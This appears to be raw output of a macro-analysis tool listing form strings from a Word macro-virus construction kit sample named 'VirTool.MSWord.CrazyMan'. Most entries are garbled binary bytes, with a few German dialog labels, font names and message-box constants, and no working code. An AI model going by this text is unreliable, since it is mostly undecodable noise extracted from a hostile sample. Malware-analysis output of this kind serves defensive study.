VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������p�������������������������������������������������������|�������������|������������������������p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����|�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������p��;�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{����p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;���p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������p�����������������������������������������������������������������������������������������������p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����|�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����|������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VbCritical.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VbQuestion.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VbExclamation
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 mit Symbol Anzeigen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VbInformation
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dialogfeld:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Titelleiste:+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zeichen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zeichen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   erstelle neues Zieldokument ...        F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Weiter ...   
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������?���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  Abbruch
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
